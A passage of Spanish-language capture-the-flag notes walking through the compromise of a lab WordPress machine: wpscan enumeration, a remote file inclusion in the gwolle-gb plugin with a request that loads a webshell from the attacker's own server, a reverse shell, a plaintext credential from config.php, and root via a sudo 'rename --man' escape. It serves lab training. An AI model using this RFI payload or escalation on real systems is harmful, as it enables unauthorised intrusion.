Hacemos el escaneo con nmap:
![[Pasted image 20231129154012.png]]
Esto es lo que corre dentro del puerto 80:
![[Pasted image 20231129154038.png]]
Hacemos fuzzing y vemos que corre un directorio llamado wordpress:
![[Pasted image 20231129154119.png]]
Accedemos a dicho directorio, donde vemos que se trata de un wordpress, pero que no le carga correctamente la información:
![[Pasted image 20231129154214.png]]
Por lo que vemos el código fuente y detectamos un dominio:
![[Pasted image 20231129154238.png]]
Lo añadimos al /etc/hosts:
![[Pasted image 20231129154309.png]]
Y ya nos carga bien la página:
![[Pasted image 20231129154325.png]]
Procedemos a enumerar posibles usuarios y plugins de este wordpress, pero debemos de activar el modo agresivo:
```bash
wpscan --url http://192.168.0.37/wordpress -e p --plugins-detection aggressive
```
![[Pasted image 20231129155224.png]]
Y tenemos la siguiente ruta:
![[Pasted image 20231129155319.png]]
Y detectamos la versión:
![[Pasted image 20231129155343.png]]
Y tenemos en exploitdb un exploit de remote file inclusion:
![[Pasted image 20231129155451.png]]
Y por aquí tenemos las instrucciones donde se nos dice que tenemos que estar alojando en un servidor web el comando malicioso que queramos ejecutar en la máquina víctima:
![[Pasted image 20231129155536.png]]
Por lo que nos preparamos el servidor web malicioso donde vamos a estar alojando una webshell:
![[Pasted image 20231129155649.png]]
![[Pasted image 20231129155706.png]]
Lo pegamos:
![[Pasted image 20231129193646.png]]
Pero no funciona, y vemos en la petición del servidor de python que busca otro archivo:
![[Pasted image 20231129194036.png]]
Por lo que vamos a renombrar la webshell a este mismo nombre:
![[Pasted image 20231129194012.png]]
Volvemos a levantar un servidor http y hacemos la petición con el nuevo nombre:
![[Pasted image 20231129194111.png]]
Y ahora vemos el resultado del comando:
```python
http://remote.nyx/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.0.32:8000/shell.php&cmd=whoami
```
![[Pasted image 20231129194129.png]]
Obtenemos la reverse shell de revshells url encodeada:
![[Pasted image 20231130100817.png]]
Lo pegamos y obtenemos la reverse shell:
![[Pasted image 20231130100835.png]]
![[Pasted image 20231130100846.png]]
![[Pasted image 20231130100856.png]]
Y dentro del archivo config.php en el directorio wordpress nos encontramos con unas credenciales:
![[Pasted image 20231130101209.png]]
Tenemos la contraseña del usuario Tiago:
```bash
tiago:WPr00t3d123!
```
![[Pasted image 20231130101322.png]]
Tenemos el siguiente binario que podemos ejecutarlo como root:
![[Pasted image 20231130101417.png]]
Si ejecutamos el menú de ayuda del programa, vemos que podemos ejecutar las páginas man como root:
![[Pasted image 20231130101701.png]]
Lo ejecutamos y una vez dentro lanzamos el comando de una bash:
```bash
sudo /usr/bin/rename --man
```
![[Pasted image 20231130101750.png]]
Y ya somos root:
![[Pasted image 20231130101811.png]]
